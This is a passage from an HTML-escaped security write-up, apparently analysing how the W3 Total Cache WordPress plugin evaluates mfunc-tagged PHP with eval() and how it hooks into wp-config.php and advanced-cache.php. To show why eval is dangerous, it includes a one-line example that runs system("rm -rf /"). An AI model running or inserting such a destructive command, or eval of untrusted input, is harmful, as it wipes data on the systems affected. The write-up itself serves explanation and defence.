class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_end_clean&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;\Exception&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$ex&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$output&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Unable&amp;ensp;to&amp;ensp;execute&amp;ensp;code:&amp;ensp;%s&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;htmlspecialchars&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$output&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;htmlspecialchars&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Invalid&amp;ensp;mfunc&amp;ensp;tag&amp;ensp;syntax.&amp;ensp;The&amp;ensp;correct&amp;ensp;format&amp;ensp;is:&amp;ensp;&amp;lt;!--&amp;ensp;W3TC_DYNAMIC_SECURITY&amp;ensp;mfunc&amp;ensp;PHP&amp;ensp;code&amp;ensp;--&amp;gt;&amp;lt;!--&amp;ensp;/mfunc&amp;ensp;W3TC_DYNAMIC_SECURITY&amp;ensp;--&amp;gt;&amp;ensp;or&amp;ensp;&amp;lt;!--&amp;ensp;W3TC_DYNAMIC_SECURITY&amp;ensp;mfunc&amp;ensp;--&amp;gt;PHP&amp;ensp;code&amp;lt;!--&amp;ensp;/mfunc&amp;ensp;W3TC_DYNAMIC_SECURITY&amp;ensp;--&amp;gt;.&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;eval()&lt;/code&gt; function at line 11 is very dangerous as it executes a string as PHP code. Example:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$command&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system(&amp;#34;rm&amp;ensp;-rf&amp;ensp;/&amp;#34;)&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;When the plugin is installed and activated, it adds to the top of &lt;code&gt;wp-config.php&lt;/code&gt;:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;/**&amp;ensp;Enable&amp;ensp;W3&amp;ensp;Total&amp;ensp;Cache&amp;ensp;*/&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;WP_CACHE&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Added&amp;ensp;by&amp;ensp;W3&amp;ensp;Total&amp;ensp;Cache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This registers caching for WordPress. &lt;code&gt;WP_CACHE&lt;/code&gt; is used in &lt;code&gt;wp-settings.php&lt;/code&gt;:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_CACHE&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;apply_filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;enable_loading_advanced_cache_dropin&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;file_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_CONTENT_DIR&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/advanced-cache.php&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_CONTENT_DIR&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/advanced-cache.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$wp_filter&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$wp_filter&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_Hook&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;build_preinitialized_hooks&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$wp_filter&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;WordPress automatically loads &lt;code&gt;advanced-cache.php&lt;/code&gt; if it exists. When activated, the plugin creates this file:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;defined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ABSPATH&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;global&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$w3tc_start_microtime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$w3tc_start_microtime&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;microtime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;defined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;WP_INSTALLING&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_INSTALLING&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;defined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;W3TC_IN_MINIFY&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;defined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;W3TC_DIR&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;W3TC_DIR&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;defined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;WP_PLUGIN_DIR&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_PLUGIN_DIR&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_CONTENT_DIR&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/plugins&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/w3-total-cache&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_dir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;W3TC_DIR&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;file_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;W3TC_DIR&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/w3-total-cache-api.php&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;defined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;WP_ADMIN&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&lt;span class=&#34;nx&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;strong&amp;gt;W3&amp;ensp;Total&amp;ensp;Cache&amp;ensp;Error:&amp;lt;/strong&amp;gt;&amp;ensp;some&amp;ensp;files&amp;ensp;appear&amp;ensp;to&amp;ensp;be&amp;ensp;missing&amp;ensp;or&amp;ensp;out&amp;ensp;of&amp;ensp;place.&amp;ensp;Please&amp;ensp;re-install&amp;ensp;plugin&amp;ensp;or&amp;ensp;remove&amp;ensp;&amp;lt;strong&amp;gt;%s&amp;lt;/strong&amp;gt;.&amp;ensp;&amp;lt;br&amp;ensp;/&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;no&#34;&gt;__FILE__&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;require_once&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;W3TC_DIR&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/w3-total-cache-api.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;class_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\W3TC\Dispatcher&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$w3tc_redirect&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span 